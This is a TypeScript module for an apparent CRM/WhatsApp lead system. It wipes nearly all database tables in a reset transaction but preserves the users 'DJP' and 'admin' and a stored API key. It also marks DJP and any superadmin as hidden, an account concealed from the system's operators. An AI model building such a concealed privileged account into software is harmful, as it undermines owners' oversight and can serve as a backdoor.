/**
 * Sistema de Reinicio Completo
 * 
 * Limpia todos los datos del sistema excepto los usuarios DJP y admin,
 * manteniendo sus credenciales y configuraciones esenciales.
 */

import { pool } from '../db';

export async function resetSystemData() {
  const client = await pool.connect();
  
  try {
    console.log('🔄 Iniciando reinicio completo del sistema...');
    
    // Comenzar transacción
    await client.query('BEGIN');
    
    // 1. Limpiar datos de mensajes y conversaciones
    console.log('📭 Limpiando mensajes y conversaciones...');
    await client.query('DELETE FROM messages WHERE id > 0');
    await client.query('DELETE FROM conversations WHERE id > 0');
    
    // 2. Limpiar leads y datos de clientes
    console.log('👥 Limpiando leads y datos de clientes...');
    await client.query('DELETE FROM leads WHERE id > 0');
    await client.query('DELETE FROM lead_activities WHERE id > 0');
    
    // 3. Limpiar actividades de agentes (excepto DJP)
    console.log('🤖 Limpiando actividades de agentes...');
    await client.query(`
      DELETE FROM agent_activities 
      WHERE agent_id NOT IN (
        SELECT id FROM external_agents 
        WHERE agent_name = 'DJP' OR agent_url LIKE '%djp%'
      )
    `);
    
    // 4. Limpiar agentes externos (excepto DJP)
    console.log('🔧 Limpiando agentes externos (preservando DJP)...');
    await client.query(`
      DELETE FROM external_agents 
      WHERE agent_name != 'DJP' 
      AND agent_url NOT LIKE '%djp%'
    `);
    
    // 5. Limpiar cuentas de WhatsApp
    console.log('📱 Limpiando cuentas de WhatsApp...');
    await client.query('DELETE FROM whatsapp_accounts WHERE id > 0');
    
    // 6. Limpiar estadísticas y métricas
    console.log('📊 Limpiando estadísticas y métricas...');
    await client.query('DELETE FROM dashboard_stats WHERE id > 0');
    
    // 7. Limpiar plantillas de mensajes
    console.log('📝 Limpiando plantillas de mensajes...');
    await client.query('DELETE FROM message_templates WHERE id > 0');
    
    // 8. Limpiar configuraciones específicas (preservando configuraciones del sistema)
    console.log('⚙️ Limpiando configuraciones específicas...');
    await client.query(`
      DELETE FROM settings 
      WHERE key NOT IN ('system_initialized', 'djp_user_hidden', 'gemini_pro_key')
    `);
    
    // 9. Limpiar usuarios (preservando DJP y admin)
    console.log('👤 Limpiando usuarios (preservando DJP y admin)...');
    await client.query(`
      DELETE FROM users 
      WHERE username NOT IN ('DJP', 'admin') 
      AND role NOT IN ('superadmin', 'super_admin')
    `);
    
    // 10. Asegurar que DJP esté marcado como oculto
    console.log('🔒 Configurando usuario DJP como oculto...');
    await client.query(`
      UPDATE users 
      SET is_hidden = true 
      WHERE username = 'DJP' OR role = 'superadmin'
    `);
    
    // 11. Resetear secuencias auto-incrementales
    console.log('🔢 Reseteando secuencias...');
    const sequences = [
      'messages_id_seq',
      'conversations_id_seq', 
      'leads_id_seq',
      'lead_activities_id_seq',
      'agent_activities_id_seq',
      'whatsapp_accounts_id_seq',
      'message_templates_id_seq'
    ];
    
    for (const seq of sequences) {
      try {
        await client.query(`ALTER SEQUENCE ${seq} RESTART WITH 1`);
      } catch (error) {
        console.log(`⚠️ Secuencia ${seq} no encontrada, continuando...`);
      }
    }
    
    // 12. Insertar configuración inicial
    console.log('📋 Insertando configuración inicial...');
    await client.query(`
      INSERT INTO settings (key, value, created_at, updated_at) 
      VALUES 
        ('djp_user_hidden', 'true', NOW(), NOW()),
        ('system_reset_date', NOW()::text, NOW(), NOW()),
        ('auto_response_enabled', 'true', NOW(), NOW())
      ON CONFLICT (key) DO UPDATE SET 
        value = EXCLUDED.value,
        updated_at = NOW()
    `);
    
    // 13. Crear estadísticas iniciales
    console.log('📈 Creando estadísticas iniciales...');
    await client.query(`
      INSERT INTO dashboard_stats (
        total_leads, 
        new_leads_this_month, 
        conversion_rate, 
        total_messages,
        created_at,
        updated_at
      ) VALUES (0, 0, 0.0, 0, NOW(), NOW())
    `);
    
    // Confirmar transacción
    await client.query('COMMIT');
    
    console.log('✅ Reinicio del sistema completado exitosamente');
    console.log('🔒 Usuario DJP configurado como oculto');
    console.log('👤 Usuarios preservados: DJP, admin');
    
    return {
      success: true,
      message: 'Sistema reiniciado correctamente',
      preserved_users: ['DJP', 'admin'],
      djp_hidden: true
    };
    
  } catch (error) {
    // Revertir en caso de error
    await client.query('ROLLBACK');
    console.error('❌ Error durante el reinicio del sistema:', error);
    
    return {
      success: false,
      message: 'Error durante el reinicio del sistema',
      error: error
    };
  } finally {
    client.release();
  }
}

export async function ensureDJPHidden() {
  const client = await pool.connect();
  
  try {
    console.log('🔒 Verificando que DJP esté oculto...');
    
    // Verificar si la columna is_hidden existe, si no, crearla
    await client.query(`
      ALTER TABLE users 
      ADD COLUMN IF NOT EXISTS is_hidden BOOLEAN DEFAULT false
    `);
    
    // Marcar DJP como oculto
    const result = await client.query(`
      UPDATE users 
      SET is_hidden = true 
      WHERE username = 'DJP' OR role = 'superadmin'
      RETURNING username, role, is_hidden
    `);
    
    console.log('✅ Usuario DJP configurado como oculto:', result.rows);
    
    return {
      success: true,
      hidden_users: result.rows
    };
    
  } catch (error) {
    console.error('❌ Error configurando DJP como oculto:', error);
    return {
      success: false,
      error: error
    };
  } finally {
    client.release();
  }
}